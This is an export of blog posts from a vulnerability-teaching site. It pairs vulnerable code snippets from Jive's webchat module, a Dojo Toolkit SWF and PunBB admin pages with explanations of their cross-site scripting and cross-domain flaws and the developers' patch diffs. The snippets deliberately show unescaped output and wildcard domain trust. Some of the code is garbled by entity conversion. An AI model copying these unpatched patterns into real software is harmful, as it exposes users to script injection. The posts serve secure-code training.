		<content:encoded><![CDATA[<blockquote><strong>I asked Dalai Lama the most important question that I think you could ask - if he had ever seen Caddyshack.</strong>
<strong> -Jesse Ventura
</strong></blockquote>
[ccnLe_java]
public class FormUtils {

private FormUtils() {
}

public static String createAnswers(FormField formField, HttpServletRequest request) {
final StringBuffer builder = new StringBuffer();
if (formField.getType().equals(FormField.TYPE_TEXT_SINGLE)) {
String cookieValue = getCookieValueForField(formField.getVariable(), request);
String insertValue = "";
if(ModelUtil.hasLength(cookieValue)){
insertValue = "value=\""+cookieValue+"\"";
}
builder.append("<input name="\&quot;&quot;" type="\&quot;text\&quot;" />");
}
else if (formField.getType().equals(FormField.TYPE_TEXT_MULTI)) {
builder.append("<textarea cols="\&quot;30\&quot;" rows="\&quot;3\&quot;" name="\&quot;&quot;">");&lt;br /&gt; builder.append("</textarea>");
}
else if (formField.getType().equals(FormField.TYPE_LIST_SINGLE)) {
builder.append("<select name="\&quot;&quot;"> <option value="\&quot;&quot;">" + option.getLabel() + "</option</select>");
}
else if (formField.getType().equals(FormField.TYPE_BOOLEAN)) {
Iterator iter = formField.getOptions();
int counter = 0;
while (iter.hasNext()) {
FormField.Option option = (FormField.Option)iter.next();
String value = option.getLabel();
builder.append("<input name="\&quot;&quot;" type="\&quot;checkbox\&quot;" value="\&quot;&quot;" />");
builder.append(" ");
builder.append(value);
builder.append(" ");

counter++;
}
}
[/ccnLe_java] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1015</wp:post_id>
		<wp:post_date>2010-08-16 08:00:35</wp:post_date>
		<wp:post_date_gmt>2010-08-16 15:00:35</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>caddyshack</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/dxnXrN]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[c6a72486c62c972e86fad87d088a7bc4]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[c6a72486c62c972e86fad87d088a7bc4]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>618</wp:comment_id>
			<wp:comment_author><![CDATA[Vulnerable Source Code &#8211; CaddyShack &#8211; Cross Site Scripting ~ SpotTheVuln.com &laquo;SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/08/caddyshack-cross-site-scripting/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-08-20 08:04:38</wp:comment_date>
			<wp:comment_date_gmt>2010-08-20 15:04:38</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] CaddyShack [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>CaddyShack – Cross Site Scripting</title>
		<link>http://spotthevuln.com/2010/08/caddyshack-cross-site-scripting/</link>
		<pubDate>Fri, 20 Aug 2010 15:00:32 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1021</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: WebChat Module for Jive

Fixed in Version: August of 2008

Issue Type: Cross Site Scripting

Original Code: <a title="Caddyshack" href="http://spotthevuln.com/2010/08/caddyshack/" target="_blank">Found    Here</a>
<h2>Description</h2>
This week’s vulnerability affected a webchat module created by Jive Software.  The bug is straightforward,  the JSP code takes an attacker controlled value and uses it to build dynamic HTML.  Although the bug is straightforward, this week’s example was a great/simple exercise in identifying a vulnerable pattern and tracing to find other vulnerable patterns in the code.  This week’s sample has three separate vulnerabilities that were all addressed via single patch.  All these have similar symptoms/patterns (although the specifics are a bit different).  Identifying vulnerable patterns and searching for these patterns in other places in code is an essential skill for security code auditors.  Did you find all three bugs that were patched?
<h2>Developers Solution</h2>
[cce lang="diff"] public class FormUtils {

private FormUtils() {
}

public static String createAnswers(FormField formField, HttpServletRequest request) {
final StringBuffer builder = new StringBuffer();
if (formField.getType().equals(FormField.TYPE_TEXT_SINGLE)) {
String cookieValue = getCookieValueForField(formField.getVariable(), request);
String insertValue = "";
if(ModelUtil.hasLength(cookieValue)){
insertValue = "value=\""+cookieValue+"\"";
}
- builder.append("&lt;input type=\"text\" name=\"" + formField.getVariable() + "\" "+insertValue+" style=\"width:75%\"&gt;");
+builder.append("&lt;input type=\"text\" name=\"" + formField.getVariable() + "\" "+StringUtils.escapeHTMLTags(insertValue)+" style=\"width:75%\"&gt;");
}
else if (formField.getType().equals(FormField.TYPE_TEXT_MULTI)) {
builder.append("&lt;textarea name=\"" + formField.getVariable() + "\" cols=\"30\" rows=\"3\"&gt;");
builder.append("&lt;/textarea&gt;");
}
else if (formField.getType().equals(FormField.TYPE_LIST_SINGLE)) {
builder.append("&lt;select name=\"" + formField.getVariable() + "\" &gt;");
Iterator iter = formField.getOptions();
String cookieValue = ModelUtil.emptyStringIfNull(getCookieValueForField(formField.getVariable(), request));
while (iter.hasNext()) {
FormField.Option option = (FormField.Option)iter.next();
String selected = option.getValue().equals(cookieValue) ? "selected" : "";
- builder.append("&lt;option value=\"" + option.getValue() + "\" "+selected+"&gt;" + option.getLabel() + "&lt;/option&gt;");
+builder.append("&lt;option value=\"" + StringUtils.escapeHTMLTags(option.getValue()) + "\" "+selected+"&gt;" + option.getLabel() + "&lt;/option&gt;");
}
builder.append("&lt;/select&gt;");
}
else if (formField.getType().equals(FormField.TYPE_BOOLEAN)) {
Iterator iter = formField.getOptions();
int counter = 0;
while (iter.hasNext()) {
FormField.Option option = (FormField.Option)iter.next();
String value = option.getLabel();
builder.append("&lt;input type=\"checkbox\" value=\"" + value + "\" name=\"" + formField.getVariable() + counter + "\"&gt;");
builder.append("&amp;nbsp;");
-builder.append(value);
+builder.append(StringUtils.escapeHTMLTags(value));
builder.append("&lt;br/&gt;");
counter++;
}
}
[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1021</wp:post_id>
		<wp:post_date>2010-08-20 08:00:32</wp:post_date>
		<wp:post_date_gmt>2010-08-20 15:00:32</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>caddyshack-cross-site-scripting</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="all-vulnerabilities"><![CDATA[All Vulnerabilities]]></category>
		<category domain="post_tag" nicename="attacker"><![CDATA[attacker]]></category>
		<category domain="post_tag" nicename="cross-site-scripting"><![CDATA[cross site scripting]]></category>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="jsp-code"><![CDATA[jsp code]]></category>
		<category domain="category" nicename="openfire"><![CDATA[Openfire]]></category>
		<category domain="post_tag" nicename="security-code"><![CDATA[security code]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="post_tag" nicename="vulnerabilities"><![CDATA[vulnerabilities]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/aPprIc]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[3b3c82ee37a34df70955fa848e34c1ec]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Cross-Site Scripting (XSS) Vulnerability Code Example]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Spinning</title>
		<link>http://spotthevuln.com/2010/08/spinning/</link>
		<pubDate>Mon, 23 Aug 2010 15:00:11 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1027</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>My advice is keep your lips away from the spinning things</strong><strong>.</strong>
<strong> -Adam Savage
</strong></blockquote>
[ccnLe_actionscript3]
public class FLVideo extends Sprite {
private var videoUrl:String;
private var video:Video;
private var connection:NetConnection;
private var autoPlay:Boolean;
private var videoStream:NetStream;
private var videoWidth:Number;
private var videoHeight:Number;
private var _currentVideo:VideoContainer;
private var preview:VideoContainer;
private var currentVolume:Number = 1;
private var isFullscreen:Boolean = false;
private var playlist:VideoPlaylist;
private var hasPlaylist:Boolean = false;
private var mode:String = "preview";

public function FLVideo() {
Security.allowDomain("*");
stage.scaleMode = StageScaleMode.NO_SCALE;
stage.align = StageAlign.TOP_LEFT;
stage.addEventListener(Event.RESIZE, onStageResize);
stage.addEventListener(FullScreenEvent.FULL_SCREEN , onFullscreenChange);
stage.addEventListener(MouseEvent.CLICK, onClick);

var obj:Object = LoaderInfo(this.root.loaderInfo).parameters;
trace(obj)

if(!obj.videoUrl){
obj = {
autoPlay: true,
isDebug: true,
videoUrl:"demo_video.flv"
};
}


// ugh - booleans not coming through
if(obj.autoPlay===true || obj.autoPlay=="true"){
autoPlay = true;
}

if(obj.volume) {
currentVolume = obj.volume;
}

if(obj.isDebug===true || obj.isDebug=="true"){
console.isDebug(true);
Tracer.init({both:true})
Tracer.log("FLVideo initialized...")
}

MovieIdentity.identity = obj.id || "default";
this.playlist = new VideoPlaylist(autoPlay, currentVolume);

if(obj.videoUrl) {
videoUrl = obj.videoUrl;
}

preview = new VideoContainer(videoUrl, autoPlay, currentVolume);
addChild(preview);
provideCallbacks();
}


public function get currentVideo():VideoContainer{

if(mode=="playlist" &amp;&amp; hasPlaylist){
return this.playlist.current;
}else{
return preview;
}
}
[/ccnLe_actionscript3] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1027</wp:post_id>
		<wp:post_date>2010-08-23 08:00:11</wp:post_date>
		<wp:post_date_gmt>2010-08-23 15:00:11</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>spinning</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="actionscript"><![CDATA[ActionScript]]></category>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure_code #development]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/90jlUs]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[229a57c7362af51cc3df20deff7ca8f8]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>635</wp:comment_id>
			<wp:comment_author><![CDATA[ActionScript, All Software, Code Snippet, Defense In Depth, DoJo Vulnerability Code Example ~SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/08/spinning-defense-in-depth/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-08-27 08:10:10</wp:comment_date>
			<wp:comment_date_gmt>2010-08-27 15:10:10</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Spinning [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Spinning - Defense in Depth</title>
		<link>http://spotthevuln.com/2010/08/spinning-defense-in-depth/</link>
		<pubDate>Fri, 27 Aug 2010 15:10:03 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1079</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: Dojo Toolkit

Fixed in Version: 1.4.1

Issue Type: Defense in Depth

Original Code: <a title="Spinning" href="http://spotthevuln.com/2010/08/spinning/" target="_blank">Found    Here</a>
<h2>Description</h2>
This was a vulnerability affecting the Dojo toolkit.   Apparently, the dojo toolkit shipped with a SWF file that had a few vulnerabilities.  This particular vulnerability affected one of those SWF files.  First, SWF files are compiled files, however they can be decompiled.  Unlike traditional server side web application languages (PHP, ASP, JSP…etc), SWF files are downloaded and rendered on the clientside.  Decompiling the SWF file gives the attacker full access to the ActionScript source code for the SWF application.

In this particular SWF file, we see that the developers explicitly set the Security.allowDomain to “*”.  This makes it so SWF flies from other, external domains can include the Dojo toolkit SWF file and script/access its internal functionality.

The Dojo toolkit devs fixed this particular issue by removing the allowDomain call and adding an Externalinterface call checking to see if a particular wrapper was available in HTML.  If you’re interested in Flash security, an excellent presentation on Flash security given by Stefano Di Paola can be found here:

<a href="http://www.slideshare.net/guestb0af15/owasp-wasc-app-sec2007-san-jose-finding-vulnsin-flash-apps">http://www.slideshare.net/guestb0af15/owasp-wasc-app-sec2007-san-jose-finding-vulnsin-flash-apps</a>
<h2>Developers Solution</h2>
[cce lang="diff"]

public class FLVideo extends Sprite {
private var videoUrl:String;
private var video:Video;
private var connection:NetConnection;
private var autoPlay:Boolean;
private var videoStream:NetStream;
private var videoWidth:Number;
private var videoHeight:Number;
private var _currentVideo:VideoContainer;
private var preview:VideoContainer;
private var currentVolume:Number = 1;
private var isFullscreen:Boolean = false;
private var playlist:VideoPlaylist;
private var hasPlaylist:Boolean = false;
private var mode:String = "preview";

public function FLVideo() {
-    Security.allowDomain("*");
+    var secure:* = ExternalInterface.call("swfIsInHTML");
+    if(secure !== true){
+        return;
+    }
+    //Security.allowDomain("*");

stage.scaleMode = StageScaleMode.NO_SCALE;
stage.align = StageAlign.TOP_LEFT;
stage.addEventListener(Event.RESIZE, onStageResize);
stage.addEventListener(FullScreenEvent.FULL_SCREEN , onFullscreenChange);
stage.addEventListener(MouseEvent.CLICK, onClick);

var obj:Object = LoaderInfo(this.root.loaderInfo).parameters;
trace(obj)

if(!obj.videoUrl){
obj = {
autoPlay: true,
isDebug: true,
videoUrl:"demo_video.flv"
};
}


// ugh - booleans not coming through
if(obj.autoPlay===true || obj.autoPlay=="true"){
autoPlay = true;
}

if(obj.volume) {
currentVolume = obj.volume;
}

if(obj.isDebug===true || obj.isDebug=="true"){
console.isDebug(true);
Tracer.init({both:true})
Tracer.log("FLVideo initialized...")
}

+    Tracer.log("secure?::", secure)
MovieIdentity.identity = obj.id || "default";
this.playlist = new VideoPlaylist(autoPlay, currentVolume);

if(obj.videoUrl) {
videoUrl = obj.videoUrl;
}

preview = new VideoContainer(videoUrl, autoPlay, currentVolume);
addChild(preview);
provideCallbacks();
}


public function get currentVideo():VideoContainer{

if(mode=="playlist" &amp;&amp; hasPlaylist){
return this.playlist.current;
}else{
return preview;
}
}
[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1079</wp:post_id>
		<wp:post_date>2010-08-27 08:10:03</wp:post_date>
		<wp:post_date_gmt>2010-08-27 15:10:03</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>spinning-defense-in-depth</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="actionscript"><![CDATA[ActionScript]]></category>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="category" nicename="all-software"><![CDATA[All Software]]></category>
		<category domain="post_tag" nicename="application-languages"><![CDATA[application languages]]></category>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="defense-in-depth"><![CDATA[Defense In Depth]]></category>
		<category domain="category" nicename="dojo"><![CDATA[DoJo]]></category>
		<category domain="post_tag" nicename="framework-level"><![CDATA[framework level]]></category>
		<category domain="post_tag" nicename="information-disclosure"><![CDATA[information disclosure]]></category>
		<category domain="post_tag" nicename="internal-functionality"><![CDATA[internal functionality]]></category>
		<category domain="post_tag" nicename="security-flaws"><![CDATA[security flaws]]></category>
		<category domain="post_tag" nicename="source-code"><![CDATA[source code]]></category>
		<category domain="post_tag" nicename="stefano-di-paola"><![CDATA[stefano di paola]]></category>
		<category domain="post_tag" nicename="swf-file"><![CDATA[swf file]]></category>
		<category domain="post_tag" nicename="swf-files"><![CDATA[swf files]]></category>
		<category domain="post_tag" nicename="validation-code"><![CDATA[validation code]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/dpi4WG]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[5ebf6184c9cb5c8c32104394278af526]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Errors</title>
		<link>http://spotthevuln.com/2010/08/errors/</link>
		<pubDate>Mon, 30 Aug 2010 15:00:01 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1084</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>Errors using inadequate data are much less than those using no data at all</strong><strong>.</strong>
<strong> -Charles Babbage
</strong></blockquote>
[ccnLe_php]
&lt;?php
if (isset($_GET['action']) || isset($_POST['prune']) || isset($_POST['prune_comply']))
{
if (isset($_POST['prune_comply']))
{
confirm_referrer('admin_prune.php');

$prune_from = $_POST['prune_from'];
$prune_days = intval($_POST['prune_days']);
$prune_date = ($prune_days) ? time() - ($prune_days*86400) : -1;

@set_time_limit(0);

if ($prune_from == 'all')
{
$result = $db-&gt;query('SELECT id FROM '.$db-&gt;prefix.'forums') or error('Unable to fetch forum list', __FILE__, __LINE__, $db-&gt;error());
$num_forums = $db-&gt;num_rows($result);

for ($i = 0; $i &lt; $num_forums; ++$i)
{
$fid = $db-&gt;result($result, $i);

prune($fid, $_POST['prune_sticky'], $prune_date);
update_forum($fid);
}
}
else
{
$prune_from = intval($prune_from);
prune($prune_from, $_POST['prune_sticky'], $prune_date);
update_forum($prune_from);
}

// Locate any "orphaned redirect topics" and delete them
$result = $db-&gt;query('SELECT t1.id FROM '.$db-&gt;prefix.'topics AS t1 LEFT JOIN '.$db-&gt;prefix.'topics AS t2 ON t1.moved_to=t2.id WHERE t2.id IS NULL AND t1.moved_to IS NOT NULL') or error('Unable to fetch redirect topics', __FILE__, __LINE__, $db-&gt;error());
$num_orphans = $db-&gt;num_rows($result);

if ($num_orphans)
{
for ($i = 0; $i &lt; $num_orphans; ++$i)
$orphans[] = $db-&gt;result($result, $i);

$db-&gt;query('DELETE FROM '.$db-&gt;prefix.'topics WHERE id IN('.implode(',', $orphans).')') or error('Unable to delete redirect topics', __FILE__, __LINE__, $db-&gt;error());
}

redirect('admin_prune.php', 'Posts pruned. Redirecting &amp;hellip;');
}
?&gt;
...&lt;snip&gt;...

&lt;div&gt;
&lt;h2&gt;&lt;span&gt;Prune&lt;/span&gt;&lt;/h2&gt;
&lt;div&gt;
&lt;form method="post" action="admin_prune.php?action=foo"&gt;
&lt;div&gt;
&lt;input type="hidden" name="prune_days" value="&lt;?php echo $prune_days ?&gt;" /&gt;
&lt;input type="hidden" name="prune_sticky" value="&lt;?php echo $_POST['prune_sticky'] ?&gt;" /&gt;
&lt;input type="hidden" name="prune_from" value="&lt;?php echo $prune_from ?&gt;" /&gt;
&lt;fieldset&gt;
&lt;legend&gt;Confirm prune posts&lt;/legend&gt;
&lt;div&gt;
&lt;p&gt;Are you sure that you want to prune all topics older than &lt;?php echo $prune_days ?&gt; days from &lt;?php echo $forum ?&gt;? (&lt;?php echo $num_topics ?&gt; topics)&lt;/p&gt;
&lt;p&gt;WARNING! Pruning posts deletes them permanently.&lt;/p&gt;
&lt;/div&gt;
&lt;/fieldset&gt;
&lt;/div&gt;
&lt;p&gt;&lt;input type="submit" name="prune_comply" value="Prune" /&gt;&lt;a href="javascript:history.go(-1)"&gt;Go back&lt;/a&gt;&lt;/p&gt;
[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1084</wp:post_id>
		<wp:post_date>2010-08-30 08:00:01</wp:post_date>
		<wp:post_date_gmt>2010-08-30 15:00:01</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>errors</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/cyu0Yv]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/cyu0Yv]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[dffd115a82ab7269ffda2ffff9d06698]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[dffd115a82ab7269ffda2ffff9d06698]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>656</wp:comment_id>
			<wp:comment_author><![CDATA[Cross-Site Scripting (XSS), PHP, PunBB, Solution Vulnerability Code Example ~SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/09/errors-cross-site-scripting/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-09-03 08:03:01</wp:comment_date>
			<wp:comment_date_gmt>2010-09-03 15:03:01</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Errors [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Errors - Cross Site Scripting</title>
		<link>http://spotthevuln.com/2010/09/errors-cross-site-scripting/</link>
		<pubDate>Fri, 03 Sep 2010 15:00:44 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1091</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: PunBB

Fixed in Version: 1.2

Issue Type: Cross Site Scripting (XSS)

Original Code: <a title="Errors" href="http://spotthevuln.com/2010/08/errors/" target="_blank">Found    Here</a>
<h2>Description</h2>
This weeks' example was a XSS bug that affected PunBB.  The vulnerable code took attacker controlled variables directly from POST parameters and used those values for various operations.  Specifically, the $_POST[‘prune_sticky’] value was used in several places without any form of sanitization.  Looking through the patch submitted by the PunBB developers we see that the unsantized value was passed to a function named prune() and also echoed in HTML markup.  PHP echo of a $_POST variable is a classic symptom of XSS.  The PunBB developers addressed this issue by sanitizing the $_POST['prune_sticky'] value before echoing its value in HTML markup.  The developer forces the $_POST[‘prune_sticky’] value to either 1 or 0, which eliminates the possibility or arbitrary script being injected via the $prune_sticky variable.  The $_POST[‘prune_sticky’] value is sanitized here:
<blockquote>$prune_sticky = isset($_POST['prune_sticky']) ? '1' : '0';</blockquote>
In addition to the changes made to PHP echo there were other changes checked in the by the PunBB developers, most notably the sanitizing of values passed to the prune() function.  Using the code snippet provided here, it’s difficult to understand exactly what is accomplished by the prune() function.  Further variable tracing will be needed in order to determine the danger associated with passing a tainted value to prune().  The developers however felt it was necessary to sanitize the $prune_sticky value before passing it to prune().
<h2>Developers Solution</h2>
[cce lang="diff"]
if (isset($_GET['action']) || isset($_POST['prune']) || isset($_POST['prune_comply']))
{
if (isset($_POST['prune_comply']))
{
confirm_referrer('admin_prune.php');

$prune_from = $_POST['prune_from'];
+$prune_sticky = isset($_POST['prune_sticky']) ? '1' : '0';
$prune_days = intval($_POST['prune_days']);
$prune_date = ($prune_days) ? time() - ($prune_days*86400) : -1;

@set_time_limit(0);

if ($prune_from == 'all')
{
$result = $db-&gt;query('SELECT id FROM '.$db-&gt;prefix.'forums') or error('Unable to fetch forum list', __FILE__, __LINE__, $db-&gt;error());
$num_forums = $db-&gt;num_rows($result);

for ($i = 0; $i &lt; $num_forums; ++$i)
{
$fid = $db-&gt;result($result, $i);

-prune($fid, $_POST['prune_sticky'], $prune_date);
+prune($fid, $prune_sticky, $prune_date);
update_forum($fid);
}
}
else
{
$prune_from = intval($prune_from);
